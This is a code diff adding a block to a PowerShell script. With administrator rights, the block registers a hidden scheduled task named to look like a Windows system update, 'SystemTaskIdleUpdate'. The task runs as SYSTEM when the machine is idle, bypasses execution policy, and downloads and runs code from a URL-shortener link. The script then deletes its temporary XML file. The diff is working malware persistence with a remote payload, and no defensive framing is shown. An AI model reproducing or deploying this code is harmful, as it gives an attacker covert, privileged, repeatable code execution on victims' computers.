@@ -134,17 +134,76 @@ $s = '';
 $s > $f;
 
 #
+#SystemTaskIdleUpdate to \ru System
+#
+
+If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{
+
+  $f=$env:TEMP;$f+='\SystemTaskIdleUpdate.xml';
+  $s = '<?xml version="1.0" encoding="UTF-16"?>
+  <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+    <RegistrationInfo>
+      <Date>2010-10-16T16:09:29</Date>
+      <Author>';
+  $s+=$env:username+'</Author>
+    </RegistrationInfo>
+    <Triggers>
+      <IdleTrigger>
+        <Enabled>true</Enabled>
+      </IdleTrigger>
+    </Triggers>
+    <Principals>
+      <Principal id="Author">
+        <UserId>';   
+  $s+='S-1-5-18'+'</UserId>
+        <LogonType>InteractiveToken</LogonType>
+        <RunLevel>LeastPrivilege</RunLevel>
+      </Principal>
+    </Principals>
+    <Settings>
+      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+      <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+      <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+      <AllowHardTerminate>true</AllowHardTerminate>
+      <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
+      <IdleSettings>
+        <Duration>PT15M</Duration>
+        <StopOnIdleEnd>true</StopOnIdleEnd>
+        <RestartOnIdle>true</RestartOnIdle>
+        <WaitTimeout>PT0S</WaitTimeout>
+      </IdleSettings>
+      <AllowStartOnDemand>true</AllowStartOnDemand>
+      <Enabled>true</Enabled>
+      <Hidden>true</Hidden>
+      <RunOnlyIfIdle>true</RunOnlyIfIdle>
+      <WakeToRun>false</WakeToRun>
+      <ExecutionTimeLimit>PT8H</ExecutionTimeLimit>
+      <Priority>7</Priority>
+    </Settings>
+    <Actions Context="Author">
+      <Exec>
+        <Command>powershell</Command>';
+  $s+="<Arguments>-nop -ep bypass -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://goo.gl/MTekjk')</Arguments>";
+  $s+='</Exec>
+    </Actions>
+  </Task>';
+
+  $s > $f;
+  schtasks.exe /Delete /F /tn "SystemTaskIdleUpdate"; 
+  schtasks.exe /Create /XML $env:TEMP"\SystemTaskIdleUpdate.xml" /tn "SystemTaskIdleUpdate" /ru System;
+
+  $s = '';
+  $s > $f;
+
+}
+
+#
 #destructor
 #
 
 del $env:TEMP"\SystemTaskIdleUpdate.xml";
 del $env:TEMP"\SystemTask.xml";
-
-#
-#SystemTaskIdleUpdate to \ru System
-#
-
-#schtasks.exe /Delete /tn "SystemTaskIdleUpdate"; #
 
 #
 # MessageBox
